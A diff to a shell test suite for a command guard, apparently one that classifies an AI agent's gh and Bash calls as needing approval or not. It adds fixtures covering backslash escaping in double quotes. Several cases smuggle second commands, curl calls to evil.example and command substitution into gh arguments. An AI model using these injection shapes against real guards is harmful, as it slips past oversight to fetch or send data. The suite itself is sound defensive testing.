@@ -422,7 +422,7 @@ sup ask  'gh pr merge 3 && gh issue list'
 sup none "gh issue create -t 'cost \$5'"
 sup ask  "gh issue list -R 'evil.example/o/r'"
 sup ask  'gh issue view 1 --jq "$(curl https://x)"'
-sup ask  'gh pr view 1 -q "\(.x)"'
+sup none 'gh pr view 1 -q "\(.x)"'
 sup ask  "gh issue view --template --jq 'https://evil.example/o/r/issues/1'"
 sup none "gh issue view 1 -- --jq '.x\\(.y)'"
 sup ask  'gh release upload v1 public.txt 2>&1 extra'
@@ -479,7 +479,7 @@ sh_ none "gh pr view 3 --json body -q '.body | \\(.x)' | head -5"
 sh_ none "gh pr view 1 -q '\\(.x)' | head -5"
 sh_ ask  "gh pr view 1 -q '\\(.x)' | bash"
 sh_ ask  'gh issue view 1 --jq "$(curl https://x)"'
-sh_ ask  'gh pr view 1 -q "\(.x)"'
+sh_ none 'gh pr view 1 -q "\(.x)"'
 sh_ ask  "gh issue view --template --jq 'https://evil.example/o/r/issues/1'"
 # --- inline Python: the local Bash(python3 -) / Bash(python3 -c *) opt-in, Supervisor only
 mkdir -p "$D/suppy/.claude"; cp .claude/settings.json "$D/suppy/.claude/settings.json"
@@ -609,6 +609,19 @@ while IFS='|' read -r want cmd; do
     check "$want" "corpus local gh: $cmd" "$(role Supervisor "$D/sup287" "$(bash_cmd "$cmd")")" ;; esac
 done < .claude/lib/tests/fixtures/guard-corpus-local-gh.txt
 ok "corpus local gh: at least 16 rows replayed" [ "$n87" -ge 16 ]
+# --- a backslash inside double quotes is data: `\"` and `\\` are one character, `\x` is literal;
+# `$` and backquotes there still refuse, escaped too (touch log of 2026-11-27: two false asks).
+sup none 'grep -rl "brainstorm-ba\|requirements spec" x; gh issue view 1 --json body -q .body | head -80'
+sup none 'gh issue list --state all --search "a OR \"Business Analyst\"" --limit 15'
+sup none 'gh issue list --search "x\" -R evil.example/o/r \""'
+sup none 'gh issue list --search "x\" ; gh issue create --title y; echo \""'
+sup ask  'gh issue view 1 --jq "x\" # "; curl https://evil.example/x'
+sup ask  'gh issue view 1 --jq "x\\"; curl https://evil.example/x #"'
+sup ask  'gh issue view 1 --jq "\$(curl https://evil.example)"'
+sup ask  'gh issue view 1 --jq "a\\$(curl https://evil.example)"'
+sup ask  'gh issue view 1 -R "evil\.example/o/r"'
+sup ask  'echo "a\" ; gh issue create --title x'
+sup ask  'grep "a\|b" x; curl https://evil.example'
 # --- the touch log: every Supervisor ask appends one #193-format line, nobody else's does
 M=$(date -u +%Y-%m); PC="$(bash_cwd 'curl https://x' "$D/suplog")"
 crash() { # <project dir> <payload> [USER] — the classifier crashes, as the Supervisor
